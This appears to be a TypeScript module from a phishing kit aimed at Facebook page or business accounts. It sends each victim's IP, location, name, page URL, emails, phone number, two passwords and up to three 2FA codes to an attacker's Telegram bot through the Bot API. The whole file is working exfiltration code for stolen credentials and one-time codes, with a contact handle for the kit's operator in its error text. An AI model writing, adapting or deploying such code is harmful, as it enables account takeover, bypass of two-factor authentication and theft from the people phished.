import axios from 'axios';
import https from 'https';

const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}`;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID!;
const agent = new https.Agent({ family: 4 });

function formatMessage(data: any): string {
    return `
<b>Ip:</b> <code>${data.ip || 'Error, contact @otis_cua'}</code>
<b>Location:</b> <code>${data.location || 'Error, contact @otis_cua'}</code>
-----------------------------
<b>Full Name:</b> <code>${data.name || ''}</code>
<b>Page Url:</b> <code>${data.fanpage || ''}</code>
-----------------------------
<b>Email:</b> <code>${data.email || ''}</code>
<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
<b>Phone Number:</b> <code>+${data.phone || ''}</code>
-----------------------------
<b>Password(1):</b> <code>${data.password || ''}</code>
<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
-----------------------------
<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>
`.trim();
}

export async function sendTelegramMessage(data: any): Promise<void> {
    const updatedText = formatMessage(data);

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: updatedText,
            parse_mode: 'HTML'
        }, {
            httpsAgent: agent,
            timeout: 10000
        });
    } catch (err: any) {
        console.error('🔥 Telegram send/edit error:', err?.response?.data || err.message || err);
        throw new Error('Failed to send or edit Telegram message');
    }
}
